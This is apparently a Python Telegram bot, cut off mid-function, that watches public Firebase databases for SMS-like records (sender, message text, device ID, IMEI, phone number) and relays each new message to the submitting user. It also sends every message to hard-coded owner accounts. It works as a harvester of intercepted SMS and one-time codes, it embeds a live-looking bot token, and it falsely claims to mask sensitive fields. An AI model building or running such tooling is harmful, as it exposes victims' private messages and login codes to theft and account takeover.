import os
import requests
import json
import time
import threading
import hashlib
import html
import speedtest
from datetime import datetime, timezone
from sseclient import SSEClient

# ---------------- CONFIG ----------------
BOT_TOKEN = "8513192978:AAHWiyU4PNvf_A0RlTzBcx0qY3EyfAa1ayw"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing inside ra.py file!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
OWNER_IDS = [1451422178, 5148880913]
PRIMARY_ADMIN_ID = 1451422178
POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5
MAX_FIREBASE_PER_USER = 5  # Maximum Firebase URLs per user
# ---------------------------------------

OFFSET = None
running = True
# Updated structure for multiple Firebase support
firebase_urls = {}    # chat_id -> list of firebase_urls
watcher_threads = {}  # chat_id -> list of threads
seen_hashes = {}      # chat_id -> dict(firebase_url -> set(hash))
approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()
SENSITIVE_KEYS = {}
firebase_cache = {}   # chat_id -> dict(firebase_url -> snapshot)
cache_time = {}       # chat_id -> dict(firebase_url -> timestamp)
CACHE_REFRESH_SECONDS = 3600  # 1 hour
blocked_devices = set()  # Store blocked device IDs
used_firebase_urls = set()  # Track all Firebase URLs being used globally
pending_permissions = {}  # user_id -> firebase_url for approval
user_firebase_count = {}  # user_id -> count of active firebases

# ---------- UTILITY FUNCTIONS ----------
def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u


def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None):
    def _send_one(cid):
        try:
            payload = {"chat_id": cid, "text": text}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            if reply_markup is not None:
                payload["reply_markup"] = reply_markup
            requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
        except Exception as e:
            print(f"send_msg -> failed to send to {cid}: {e}")

    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            _send_one(cid)
    else:
        _send_one(chat_id)


def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        print("get_updates error:", e)
        return []


def http_get_json(url):
    try:
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print("http_get_json error for", url, "->", e)
        return None


def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3


def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found


def extract_fields(obj):
    device = (
        obj.get("device")
        or obj.get("deviceId")
        or obj.get("device_id")
        or obj.get("imei")
        or obj.get("id")
        or "Unknown"
    )
    sender = (
        obj.get("from")
        or obj.get("sender")
        or obj.get("address")
        or obj.get("number")
        or "Unknown"
    )
    message = (
        obj.get("message")
        or obj.get("msg")
        or obj.get("body")
        or obj.get("text")
        or ""
    )
    ts = (
        obj.get("time")
        or obj.get("timestamp")
        or obj.get("date")
        or obj.get("created_at")
        or None
    )
    if isinstance(ts, (int, float)):
        try:
            ts = (
                datetime.fromtimestamp(float(ts), tz=timezone.utc)
                .astimezone()
                .strftime("%d/%m/%Y, %I:%M:%S %p")
            )
        except Exception:
            ts = str(ts)
    elif isinstance(ts, str):
        digits = "".join(ch for ch in ts if ch.isdigit())
        if len(digits) == 10:
            try:
                ts = (
                    datetime.fromtimestamp(int(digits), tz=timezone.utc)
                    .astimezone()
                    .strftime("%d/%m/%Y, %I:%M:%S %p")
                )
            except Exception:
                pass
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = (
        obj.get("phone") or obj.get("mobile") or obj.get("MobileNumber") or None
    )
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "device_phone": device_phone,
    }


def compute_hash(path, obj):
    try:
        return hashlib.sha1(
            (path + json.dumps(obj, sort_keys=True, default=str)).encode()
        ).hexdigest()
    except Exception:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()


def format_notification(fields, user_id):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    text = (
        f"🆕 <b>New SMS Received</b>\n\n"
        f"📱 Device: <code>{device}</code>\n"
        f"👤 From: <b>{sender}</b>\n"
        f"💬 Message: {message}\n"
        f"🕐 Time: {t}\n"
        f"👤 Forwarded by User ID: <code>{user_id}</code>"
    )
    if fields.get("device_phone"):
        text += (
            f"\n📞 Device Number: "
            f"<code>{html.escape(str(fields.get('device_phone')))}</code>"
        )
    return text


def notify_user_owner(chat_id, fields):
    # Check if device is blocked
    device_id = fields.get("device", "")
    if device_id and device_id in blocked_devices:
        print(f"📵 Skipping notification for blocked device: {device_id}")
        return
    
    text = format_notification(fields, chat_id)
    send_msg(chat_id, text)
    send_msg(OWNER_IDS, text)


# ---------- SSE WATCHER ----------
def sse_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    stream_url = url + "?print=silent"
    seen = seen_hashes.setdefault(chat_id, {}).setdefault(base_url, set())
    send_msg(chat_id, f"⚡ SSE (live) started for Firebase.\n\n📌 URL: <code>{base_url}</code>")
    retries = 0
    while base_url in firebase_urls.get(chat_id, []):
        try:
            client = SSEClient(stream_url)
            for event in client.events():
                if base_url not in firebase_urls.get(chat_id, []):
                    break
                if not event.data or event.data == "null":
                    continue
                try:
                    data = json.loads(event.data)
                except Exception:
                    continue
                payload = (
                    data.get("data")
                    if isinstance(data, dict) and "data" in data
                    else data
                )
                nodes = find_sms_nodes(payload, "")
                for path, obj in nodes:
                    h = compute_hash(path, obj)
                    if h in seen:
                        continue
                    seen.add(h)
                    fields = extract_fields(obj)
                    
                    # Check if device is blocked before notifying
                    device_id = fields.get("device", "")
                    if device_id and device_id in blocked_devices:
                        print(f"📵 Skipping blocked device: {device_id}")
                        continue
                    
                    notify_user_owner(chat_id, fields)
            retries = 0
        except Exception as e:
            print(f"SSE error ({chat_id}):", e)
            retries += 1
            if retries >= MAX_SSE_RETRIES:
                send_msg(
                    chat_id,
                    f"⚠️ SSE failed multiple times for Firebase: <code>{base_url}</code>\nFalling back to polling...",
                )
                poll_loop(chat_id, base_url)
                break
            backoff = min(30, 2 ** retries)
            time.sleep(backoff)


# ---------- POLLING FALLBACK ----------
def poll_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    seen = seen_hashes.setdefault(chat_id, {}).setdefault(base_url, set())
    send_msg(chat_id, f"📡 Polling started for Firebase (every {POLL_INTERVAL}s).\n\n📌 URL: <code>{base_url}</code>")
    while base_url in firebase_urls.get(chat_id, []):
        snap = http_get_json(url)
        if not snap:
            time.sleep(POLL_INTERVAL)
            continue
        nodes = find_sms_nodes(snap, "")
        for path, obj in nodes:
            h = compute_hash(path, obj)
            if h in seen:
                continue
            seen.add(h)
            fields = extract_fields(obj)
            
            # Check if device is blocked before notifying
            device_id = fields.get("device", "")
            if device_id and device_id in blocked_devices:
                print(f"📵 Skipping blocked device: {device_id}")
                continue
            
            notify_user_owner(chat_id, fields)
        time.sleep(POLL_INTERVAL)
    send_msg(chat_id, f"⛔ Polling stopped for Firebase: <code>{base_url}</code>")


# ---------- START / STOP ----------
def start_watcher(chat_id, base_url):
    if chat_id not in firebase_urls:
        firebase_urls[chat_id] = []
    if base_url in firebase_urls[chat_id]:
        send_msg(chat_id, f"⚠️ Firebase URL is already being monitored: <code>{base_url}</code>")
        return False
    
    # Check if user has reached limit
    current_count = len(firebase_urls.get(chat_id, []))
    if current_count >= MAX_FIREBASE_PER_USER:
        send_msg(chat_id, f"❌ You have reached the maximum limit of {MAX_FIREBASE_PER_USER} Firebase URLs.\n\nPlease stop one of your existing monitors first.")
        return False
    
    firebase_urls[chat_id].append(base_url)
    if chat_id not in seen_hashes:
        seen_hashes[chat_id] = {}
    seen_hashes[chat_id][base_url] = set()
    
    # Mark as used globally
    used_firebase_urls.add(base_url)
    
    # Update user count
    user_firebase_count[chat_id] = user_firebase_count.get(chat_id, 0) + 1
    
    json_url = normalize_json_url(base_url)
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id][base_url].add(compute_hash(p, o))
    
    # Start watcher thread
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url), daemon=True)
    if chat_id not in watcher_threads:
        watcher_threads[chat_id] = []
    watcher_threads[chat_id].append(t)
    t.start()
    
    send_msg(chat_id, f"✅ Monitoring started for Firebase.\n\n📌 URL: <code>{base_url}</code>\n\n📊 You are now monitoring {len(firebase_urls[chat_id])}/{MAX_FIREBASE_PER_USER} Firebase URLs.")
    send_msg(OWNER_IDS, f"👤 User <code>{chat_id}</code> started monitoring new Firebase:\n<code>{base_url}</code>")
    
    refresh_firebase_cache_single(chat_id, base_url)
    return True


def stop_watcher_single(chat_id, base_url=None):
    if chat_id not in firebase_urls or not firebase_urls[chat_id]:
        return False
    
    if base_url is None:
        # Stop all for this user
        urls_to_stop = firebase_urls[chat_id].copy()
    else:
        if base_url not in firebase_urls[chat_id]:
            return False
        urls_to_stop = [base_url]
    
    for url in urls_to_stop:
        if url in firebase_urls[chat_id]:
            firebase_urls[chat_id].remove(url)
        
        # Clean up global tracking
        if url in used_firebase_urls:
            # Check if any other user is using this URL
            still_in_use = False
            for uid, urls in firebase_urls.items():
                if url in urls:
                    still_in_use = True
                    break
            if not still_in_use:
                used_firebase_urls.remove(url)
        
        # Clean up cache
        if chat_id in seen_hashes and url in seen_hashes[chat_id]:
            del seen_hashes[chat_id][url]
        
        if chat_id in firebase_cache and url in firebase_cache[chat_id]:
            del firebase_cache[chat_id][url]
        
        if chat_id in cache_time and url in cache_time[chat_id]:
            del cache_time[chat_id][url]
    
    # Update count
    user_firebase_count[chat_id] = len(firebase_urls.get(chat_id, []))
    
    # Clean up empty entries
    if chat_id in firebase_urls and not firebase_urls[chat_id]:
        del firebase_urls[chat_id]
    if chat_id in seen_hashes and not seen_hashes[chat_id]:
        del seen_hashes[chat_id]
    
    if base_url is None:
        send_msg(chat_id, "🛑 All Firebase monitoring stopped.")
    else:
        send_msg(chat_id, f"🛑 Monitoring stopped for Firebase: <code>{base_url}</code>")
    
    return True


def stop_all_watchers():
    """Stop all Firebase monitoring for all users (admin only)"""
    users_to_stop = list(firebase_urls.keys())
    total_stopped = 0
    for chat_id in users_to_stop:
        if stop_watcher_single(chat_id):
            total_stopped += 1
    return total_stopped


# ---------- BLOCK FUNCTIONS ----------
def extract_device_id_from_message(msg_text):
    """Extract device ID from message text"""
    if not msg_text:
        return None
    
    lines = msg_text.split('\n')
    for line in lines:
        if 'Device:' in line or '📱 Device:' in line:
            parts = line.split(':', 1)
            if len(parts) > 1:
                device_id = parts[1].strip()
                device_id = device_id.replace('<code>', '').replace('</code>', '')
                return device_id
    return None


def block_device(device_id):
    """Block a device by ID"""
    blocked_devices.add(device_id)
    return True


def unblock_device(device_id):
    """Unblock a device by ID"""
    if device_id in blocked_devices:
        blocked_devices.remove(device_id)
        return True
    return False


def get_blocked_devices():
    """Get list of all blocked devices"""
    return sorted(list(blocked_devices))


# ---------- APPROVAL HELPERS ----------
def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


def is_approved(user_id: int) -> bool:
    return user_id in approved_users or is_owner(user_id)


def handle_not_approved(chat_id, msg):
    from_user = msg.get("from", {}) or {}
    first_name = from_user.get("first_name", "")
    username = from_user.get("username", None)
    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": "📨 Contact Admin",
                    "url": f"tg://user?id={PRIMARY_ADMIN_ID}",
                }
            ]
        ]
    }
    user_info_lines = [
        "❌ You are not approved to use this bot yet.",
        "",
        "Tap the button below to contact admin for access.",
        "",
        f"🆔 Your User ID: <code>{chat_id}</code>",
    ]
    if username:
        user_info_lines.append(f"👤 Username: @{html.escape(username)}")
    send_msg(chat_id, "\n".join(user_info_lines), reply_markup=reply_markup)
    owner_text = [
        "⚠️ New user tried to use the bot:",
        f"ID: <code>{chat_id}</code>",
        f"Name: {html.escape(first_name)}",
    ]
    if username:
        owner_text.append(f"Username: @{html.escape(username)}")
    owner_text.append("")
    owner_text.append(f"Approve with: <code>/approve {chat_id}</code>")
    send_msg(OWNER_IDS, "\n".join(owner_text))


def format_uptime(seconds: int) -> str:
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours:
        parts.append(f"{hours}h")
    if minutes:
        parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)


# ---------- NETWORK SPEED TEST ----------
def get_network_speed():
    try:
        st = speedtest.Speedtest()
        st.get_best_server()
        download_speed = st.download() / 1_000_000  # Convert to Mbps
        upload_speed = st.upload() / 1_000_000  # Convert to Mbps
        ping = st.results.ping
        
        return {
            "download": f"{download_speed:.2f} Mbps",
            "upload": f"{upload_speed:.2f} Mbps",
            "ping": f"{ping:.2f} ms"
        }
    except Exception as e:
        print(f"Speed test error: {e}")
        return {
            "download": "Failed",
            "upload": "Failed",
            "ping": "Failed"
        }


# ---------- SAFE DEVICE SEARCH ----------
def mask_number(value: str, keep_last: int = 2) -> str:
    if not value:
        return ""
    s = "".join(ch for ch in str(value) if ch.isdigit())
    if len(s) <= keep_last:
        return "*" * len(s)
    return "*" * (len(s) - keep_last) + s[-keep_last:]


def search_records_by_device(snapshot, device_id, path=""):
    matches = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if str(k) == str(device_id) and isinstance(v, dict):
                matches.append(v)
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    return matches


def safe_format_device_record(rec: dict) -> str:
    lines = ["🔍 <b>Record found for this device</b>", ""]
    for k, v in rec.items():
        key_lower = str(k).lower()
        if key_lower in SENSITIVE_KEYS:
            masked = mask_number(v, keep_last=2)
            show_val = f"{masked} (hidden)"
        else:
            show_val = str(v)
        lines.append(
            f"<b>{html.escape(str(k))}</b>: <code>{html.escape(show_val)}</code>"
        )
    lines.append("")
    lines.append("⚠️ Highly sensitive fields are masked for security.")
    return "\n".join(lines)


# ---------- CACHE FUNCTIONS ----------
def refresh_firebase_cache_single(chat_id, base_url):
    if chat_id not in firebase_urls or base_url not in firebase_urls[chat_id]:
        return
    
    snap = http_get_json(normalize_json_url(base_url))
    if snap is None:
        return
    
    if chat_id not in firebase_cache:
        firebase_cache[chat_id] = {}
    firebase_cache[chat_id][base_url] = snap
    
    if chat_id not in cache_time:
        cache_time[chat_id] = {}
    cache_time[chat_id][base_url] = time.time()


def cache_refresher_loop():
    while True:
        now = time.time()
        for chat_id, urls in list(firebase_urls.items()):
            for url in urls:
                last_refresh = cache_time.get(chat_id, {}).get(url, 0)
                if now - last_refresh >= CACHE_REFRESH_SECONDS:
                    refresh_firebase_cache_single(chat_id, url)
        time.sleep(60)


# ---------- PERMISSION SYSTEM ----------
def request_permission(chat_id, firebase_url):
    """Request permission to add a new Firebase URL"""
    if chat_id not in user_firebase_count:
        user_firebase_count[chat_id] = 0
    
    if user_firebase_count[chat_id] >= MAX_FIREBASE_PER_USER:
        pending_permissions[chat_id] = firebase_url
        
        # Create keyboard with options
        reply_markup = {
            "inline_keyboard": [
                [
                    {"text": "✅ Stop One Firebase", "callback_data": f"stop_one:{chat_id}"},
                    {"text": "❌ Cancel", "callback_data": f"cancel_permission:{chat_id}"}
                ]
            ]
        }
        
        # Get user's current Firebase URLs
        current_urls = firebase_urls.get(chat_id, [])
        urls_text = "\n".join([f"{i+1}. <code>{url}</code>" for i, url in enumerate(current_urls)])
        
        message = (
            f"⚠️ <b>Permission Required</b>\n\n"
            f"You have reached the maximum limit of {MAX_FIREBASE_PER_USER} Firebase URLs.\n\n"
            f"<b>Current Firebase URLs:</b>\n{urls_text}\n\n"
            f"<b>New Firebase URL:</b>\n<code>{firebase_url}</code>\n\n"
            f"Please choose an option:\n"
            f"• Stop monitoring one of your existing Firebase URLs\n"
            f"• Cancel adding new Firebase URL"
        )
        
        send_msg(chat_id, message, reply_markup=reply_markup)
        return False
    return True


# ---------- BROADCAST FUNCTION ----------
def broadcast_message(sender_id, message_text):
    """Broadcast message to all approved users"""
    if not is_owner(sender_id):
        return "❌ Only owners can broadcast messages."
    
    if not message_text:
        return "❌ Please provide a message to broadcast."
    
    success_count = 0
    fail_count = 0
    
    # Send to all approved users
    for user_id in approved_users:
        try:
            send_msg(user_id, f"📢 <b>Broadcast Message</b>\n\n{message_text}")
            success_count += 1
        except Exception as e:
            print(f"Broadcast failed for {user_id}: {e}")
            fail_count += 1
    
    # Send to owners
    for owner_id in OWNER_IDS:
        if owner_id != sender_id:
            send_msg(owner_id, f"📢 <b>Broadcast Message</b>\n\n{message_text}")
    
    return f"✅ Broadcast sent to {success_count} users. Failed: {fail_count}"


# ---------- CALLBACK QUERY HANDLER ----------
def handle_callback_query(query):
    """Handle inline keyboard callbacks"""
    try:
        chat_id = query["from"]["id"]
        data = query["data"]
        
        if data.startswith("stop_one:"):
            user_id = int(data.split(":")[1])
            if chat_id != user_id and not is_owner(chat_id):
                return
            
            if user_id in pending_permissions:
                firebase_url = pending_permissions[user_id]
                current_urls = firebase_urls.get(user_id, [])
                
                # Create keyboard to select which Firebase to stop
                keyboard = []
                for i, url in enumerate(current_urls):
                    keyboard.append([{"text": f"Stop Firebase {i+1}", "callback_data": f"confirm_stop:{user_id}:{i}"}])
                keyboard.append([{"text": "❌ Cancel", "callback_data": f"cancel_permission:{user_id}"}])
                
                reply_markup = {"inline_keyboard": keyboard}
                
                message = (
                    f"Select which Firebase to stop:\n\n"
                    f"<b>New Firebase waiting:</b>\n<code>{firebase_url}</code>"
                )
                
                send_msg(chat_id, message, reply_markup=reply_markup)
        
        elif data.startswith("confirm_stop:"):
            parts = data.split(":")
            user_id = int(parts[1])
            index = int(parts[2])
            
            if chat_id != user_id and not is_owner(chat_id):
                return
            
            current_urls = firebase_urls.get(user_id, [])
            if 0 <= index < len(current_urls):
                url_to_stop = current_urls[index]
                stop_watcher_single(user_id, url_to_stop)
                
                # Now start the new one
                if user_id in pending_permissions:
                    new_url = pending_permissions[user_id]
                    if start_watcher(user_id, new_url):
                        del pending_permissions[user_id]
                        send_msg(chat_id, f"✅ Stopped Firebase {index+1} and started new Firebase.")
                    else:
                        send_msg(chat_id, "❌ Failed to start new Firebase.")
        
        elif data.startswith("cancel_permission:"):
            user_id = int(data.split(":")[1])
            if chat_id != user_id and not is_owner(chat_id):
                return
            
            if user_id in pending_permissions:
                del pending_permissions[user_id]
                send_msg(chat_id, "❌ Permission request cancelled.")
    
    except Exception as e:
        print(f"Callback query error: {e}")


# ---------- COMMAND HANDLING ----------
def handle_update(u):
    # Handle callback queries
    if "callback_query" in u:
        handle_callback_query(u["callback_query"])
        
        # Answer callback query
        try:
            callback_id = u["callback_query"]["id"]
            requests.post(f"{API_URL}/answerCallbackQuery", json={"callback_query_id": callback_id})
        except:
            pass
        return
    
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()

    if not chat_id or not text:
        return

    # Reply-based /find shortcut
    if text.lower() == "/find" and msg.get("reply_to_message"):
        reply = msg.get("reply_to_message")
        for line in (reply.get("text") or "").splitlines():
            if "Device:" in line:
                text = "/find " + line.split("Device:", 1)[1].strip()
                break

    lower_text = text.lower()

    # FIRST: approval check
    if not is_approved(chat_id):
        handle_not_approved(chat_id, msg)
        return

    # /start - FIXED: SHOW DIFFERENT COMMANDS BASED ON USER/ADMIN
    if lower_text == "/start":
        # User commands section
        user_commands = (
            "👋 <b>Welcome to Firebase SMS Monitor Bot!</b>\n\n"
            "📌 <b>You are approved to use this bot.</b>\n\n"
            "📡 <b>How to use:</b>\n"
            "1. Send your Firebase RTDB base URL (public, .json)\n"
            "2. Bot will start monitoring for SMS messages\n"
            "3. You'll receive notifications for new SMS\n\n"
            "📊 <b>User Commands:</b>\n"
            "• <code>/start</code> - Show this message\n"
            "• <code>/stop</code> - Stop your monitoring\n"
            "• <code>/stop &lt;url&gt;</code> - Stop specific Firebase\n"
            "• <code>/list</code> - Show your Firebase URLs\n"
            "• <code>/find &lt;device_id&gt;</code> - Search record by device ID\n"
            "• <code>/ping</code> - Bot status & network speed\n"
            "• <code>/help</code> - Show all commands\n\n"
        )
        
        # Admin commands section (only for owners)
        if is_owner(chat_id):
            admin_commands = (
                "👑 <b>Admin Commands (owners only):</b>\n"
                "• <code>/adminlist</code> - Show all Firebase URLs\n"
                "• <code>/approve &lt;user_id&gt;</code> - Approve user\n"
                "• <code>/unapprove &lt;user_id&gt;</code> - Remove approval\n"
                "• <code>/approvedlist</code> - List approved users\n"
                "• <code>/block &lt;device_id&gt;</code> - Block device (or reply)\n"
                "• <code>/unblock &lt;device_id&gt;</code> - Unblock device\n"
                "• <code>/blockedlist</code> - Show blocked devices\n"
                "• <code>/stopall</code> - Stop all monitoring\n"
                "• <code>/broadcast &lt;message&gt;</code> - Broadcast message\n"
                "• <code>/stats</code> - Show bot statistics\n\n"
            )
            final_message = user_commands + admin_commands
        else:
            final_message = user_commands
        
        final_message += (
            "📝 <b>Note:</b>\n"
            "• You can monitor up to 5 Firebase URLs\n"
            "• Each Firebase URL can only be used by one user at a time\n"
            "• Contact admin for any issues\n\n"
            "🚀 <b>Send your Firebase URL to get started!</b>"
        )
        
        send_msg(chat_id, final_message)
        return

    # /ping - UPDATED: WITH NETWORK SPEED
    if lower_text == "/ping":
        uptime_sec = int(time.time() - BOT_START_TIME)
        uptime_str = format_uptime(uptime_sec)
        
        # Get network speed
        speed_info = get_network_speed()
        
        # Basic info for all users
        monitored_count = sum(len(urls) for urls in firebase_urls.values())
        user_urls_count = len(firebase_urls.get(chat_id, []))
        approved_count = len(approved_users)
        blocked_count = len(blocked_devices)
        
        status_text = (
            "🏓 <b>Pong! Bot Status</b>\n\n"
            "✅ Bot is <b>online</b> and responding.\n\n"
            f"⏱ <b>Uptime:</b> <code>{uptime_str}</code>\n"
            f"📡 <b>Your Active Monitors:</b> <code>{user_urls_count}/{MAX_FIREBASE_PER_USER}</code>\n"
            f"🌐 <b>Total Active Monitors:</b> <code>{monitored_count}</code>\n"
            f"👥 <b>Approved Users:</b> <code>{approved_count}</code>\n"
            f"📵 <b>Blocked Devices:</b> <code>{blocked_count}</code>\n\n"
            f"📶 <b>Network Speed:</b>\n"
            f"   ⬇️ Download: <code>{speed_info['download']}</code>\n"
            f"   ⬆️ Upload: <code>{speed_info['upload']}</code>\n"
            f"   📍 Ping: <code>{speed_info['ping']}</code>"
        )
        
        # Additional info for admins
        if is_owner(chat_id):
            total_users = len(firebase_urls)
            status_text += (
                f"\n\n👑 <b>Admin Stats:</b>\n"
                f"   👤 Active Users: <code>{total_users}</code>\n"
                f"   🔗 Unique Firebase URLs: <code>{len(used_firebase_urls)}</code>\n"
                f"   ⏰ Cache Age: <code>{CACHE_REFRESH_SECONDS}s</code>"
            )
        
        send_msg(chat_id, status_text)
        return

    # /stop [url] - Stop specific or all monitoring
    if lower_text.startswith("/stop"):
        parts = text.split(maxsplit=1)
        if len(parts) == 1:
            # Stop all for user
            stop_watcher_single(chat_id)
        else:
            # Stop specific URL
            url_to_stop = parts[1].strip()
            if url_to_stop.startswith("http"):
                stop_watcher_single(chat_id, url_to_stop)
            else:
                send_msg(chat_id, "❌ Please provide a valid Firebase URL to stop.")
        return

    # /list - Show user's Firebase URLs
    if lower_text == "/list":
        user_urls = firebase_urls.get(chat_id, [])
        if not user_urls:
            send_msg(chat_id, "ℹ️ You don't have any active Firebase monitoring yet.")
            return
        
        urls_text = "\n".join([f"{i+1}. <code>{url}</code>" for i, url in enumerate(user_urls)])
        message = (
            f"📋 <b>Your Firebase URLs ({len(user_urls)}/{MAX_FIREBASE_PER_USER})</b>\n\n"
            f"{urls_text}\n\n"
            f"<i>Use</i> <code>/stop &lt;url&gt;</code> <i>to stop specific monitoring</i>"
        )
        send_msg(chat_id, message)
        return

    # /adminlist - Admin view
    if lower_text == "/adminlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ This command is only for bot owners.")
            return
        if not firebase_urls:
            send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            return
        
        lines = []
        total_monitors = 0
        for uid, urls in firebase_urls.items():
            if urls:
                total_monitors += len(urls)
                url_list = "\n    ".join([f"• <code>{html.escape(str(url))}</code>" for url in urls])
                lines.append(f"👤 <code>{uid}</code> ({len(urls)}):\n    {url_list}")
        
        message = (
            f"👑 <b>All Active Firebase URLs</b>\n"
            f"📊 Total Users: <code>{len(firebase_urls)}</code>\n"
            f"📡 Total Monitors: <code>{total_monitors}</code>\n\n" +
            "\n\n".join(lines)
        )
        send_msg(chat_id, message)
        return

    # -------- Admin-only block commands --------
    if lower_text.startswith("/block"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can block devices.")
            return
        
        # Check if replying to a message
        reply_msg = msg.get("reply_to_message")
        if reply_msg and reply_msg.get("text"):
            device_id = extract_device_id_from_message(reply_msg.get("text"))
            if device_id:
                if block_device(device_id):
                    send_msg(chat_id, f"✅ Device <code>{device_id}</code> has been blocked.")
                    return
                else:
                    send_msg(chat_id, f"❌ Failed to block device <code>{device_id}</code>.")
                    return
        
        # If not replying, check for device ID in command
        parts = text.split()
        if len(parts) < 2 or not parts[1].strip():
            send_msg(chat_id, "Usage: <code>/block device_id</code> or reply to a device message with /block")
            return
        
        device_id = parts[1].strip()
        if block_device(device_id):
            send_msg(chat_id, f"✅ Device <code>{device_id}</code> has been blocked.")
        else:
            send_msg(chat_id, f"❌ Failed to block device <code>{device_id}</code>.")
        return

    if lower_text.startswith("/unblock"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can unblock devices.")
            return
        
        parts = text.split()
        if len(parts) < 2 or not parts[1].strip():
            send_msg(chat_id, "Usage: <code>/unblock device_id</code>")
            return
        
        device_id = parts[1].strip()
        if unblock_device(device_id):
            send_msg(chat_id, f"✅ Device <code>{device_id}</code> has been unblocked.")
        else:
            send_msg(chat_id, f"ℹ️ Device <code>{device_id}</code> was not blocked.")
        return

    if lower_text == "/blockedlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can see blocked devices list.")
            return
        
        devices = get_blocked_devices()
        if not devices:
            send_msg(chat_id, "📭 No devices are currently blocked.")
            return
        
        devices_text = "\n".join([f"• <code>{device}</code>" for device in devices])
        send_msg(
            chat_id,
            f"📵 <b>Blocked Devices ({len(devices)})</b>:\n\n{devices_text}"
        )
        return

    # /stopall command (admin only)
    if lower_text == "/stopall":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can stop all monitoring.")
            return
        
        stopped_count = stop_all_watchers()
        send_msg(chat_id, f"🛑 Stopped monitoring for <b>{stopped_count}</b> users.")
        return

    # /broadcast command (admin only)
    if lower_text.startswith("/broadcast"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can broadcast messages.")
            return
        
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/broadcast your message here</code>")
            return
        
        message_text = parts[1]
        result = broadcast_message(chat_id, message_text)
        send_msg(chat_id, result)
        return

    # /stats command (admin only)
    if lower_text == "/stats":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can view statistics.")
            return
        
        uptime_sec = int(time.time() - BOT_START_TIME)
        uptime_str = format_uptime(uptime_sec)
        
        total_users = len(firebase_urls)
        total_monitors = sum(len(urls) for urls in firebase_urls.values())
        unique_firebase = len(used_firebase_urls)
        approved_count = len(approved_users)
        blocked_count = len(blocked_devices)
        pending_count = len(pending_permissions)
        
        stats_text = (
            "📊 <b>Bot Statistics</b>\n\n"
            f"⏱ <b>Uptime:</b> <code>{uptime_str}</code>\n"
            f"👥 <b>Approved Users:</b> <code>{approved_count}</code>\n"
            f"👤 <b>Active Users:</b> <code>{total_users}</code>\n"
            f"📡 <b>Active Monitors:</b> <code>{total_monitors}</code>\n"
